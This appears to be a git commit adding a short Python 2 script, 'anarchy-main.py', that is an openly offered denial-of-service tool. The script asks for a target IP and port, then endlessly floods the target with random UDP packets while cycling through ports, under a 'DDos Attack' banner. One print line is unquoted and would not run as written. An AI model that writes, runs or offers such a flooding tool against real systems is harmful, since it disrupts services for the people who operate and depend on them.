4a258c891d2cf7a007ff50e657472632cfa98344
v9le <78435846+v9le@users.noreply.github.com>
2021-03-17 23:01:26 -0400

    Add files via upload

---
+++ anarchy-main.py
@@ -0,0 +1,39 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print lol get slammed! xD
+print
+ip = raw_input("IP/Hostname: ")
+port = input("Port: ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
